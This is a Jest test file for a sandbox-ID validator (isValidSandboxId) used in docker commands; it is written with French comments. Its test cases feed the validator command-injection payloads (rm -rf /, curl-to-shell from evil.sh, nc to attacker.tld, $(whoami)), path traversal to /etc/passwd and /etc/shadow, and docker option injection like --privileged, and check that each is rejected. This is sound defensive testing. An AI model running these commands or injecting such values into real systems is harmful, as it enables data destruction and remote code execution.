import { describe, test, expect } from "@jest/globals";
import { isValidSandboxId, createSandboxId } from "../utils/sandboxId.js";

describe("isValidSandboxId — identifiants légitimes", () => {
  test.each([
    "sandbox-1726650000000",
    "sandbox-1726650000000ab12cd",
    "sandbox-abc123",
  ])("accepte %s", (id) => {
    expect(isValidSandboxId(id)).toBe(true);
  });

  test("accepte tout identifiant produit par createSandboxId()", () => {
    for (let i = 0; i < 50; i++) {
      expect(isValidSandboxId(createSandboxId())).toBe(true);
    }
  });
});

describe("isValidSandboxId — injection de commande OS", () => {
  // Ces charges utiles correspondent à la vulnérabilité BLOCKER remontée par
  // SonarQube : un sandboxId interpolé dans exec(`docker ... ${sandboxId}`).
  test.each([
    "sandbox-abc; rm -rf /",
    "sandbox-abc && curl http://evil.sh | sh",
    "sandbox-abc | nc attacker.tld 4444",
    "sandbox-abc$(whoami)",
    "sandbox-abc`id`",
    "sandbox-abc\nrm -rf /",
    "sandbox-abc & ping -c 10 127.0.0.1",
  ])("rejette %j", (payload) => {
    expect(isValidSandboxId(payload)).toBe(false);
  });
});

describe("isValidSandboxId — path traversal", () => {
  test.each([
    "../../etc/passwd",
    "sandbox-../../../root",
    "sandbox-abc/../../secret",
    "..\\..\\Windows\\System32",
    "/etc/shadow",
  ])("rejette %j", (payload) => {
    expect(isValidSandboxId(payload)).toBe(false);
  });
});

describe("isValidSandboxId — injection d'argument", () => {
  // execFile protège de l'injection de commande shell, PAS de celle-ci :
  // un argument commençant par un tiret est lu par docker comme une option.
  test.each(["-f", "--format", "-v", "--rm", "--privileged"])(
    "rejette l'option docker %s",
    (payload) => {
      expect(isValidSandboxId(payload)).toBe(false);
    }
  );
});

describe("isValidSandboxId — entrées malformées", () => {
  test.each([
    ["chaîne vide", ""],
    ["préfixe absent", "monsandbox-123"],
    ["underscore interdit", "sandbox-abc_def"],
    ["tiret interne interdit", "sandbox-abc-def"],
    ["espace", "sandbox-abc def"],
    ["suffixe manquant", "sandbox-"],
  ])("rejette %s", (_label, payload) => {
    expect(isValidSandboxId(payload)).toBe(false);
  });

  test.each([
    ["undefined", undefined],
    ["null", null],
    ["nombre", 12345],
    ["objet", { toString: () => "sandbox-abc" }],
    ["tableau", ["sandbox-abc"]],
  ])("rejette le type %s", (_label, payload) => {
    expect(isValidSandboxId(payload)).toBe(false);
  });

  test("rejette un identifiant démesurément long", () => {
    expect(isValidSandboxId("sandbox-" + "a".repeat(500))).toBe(false);
  });
});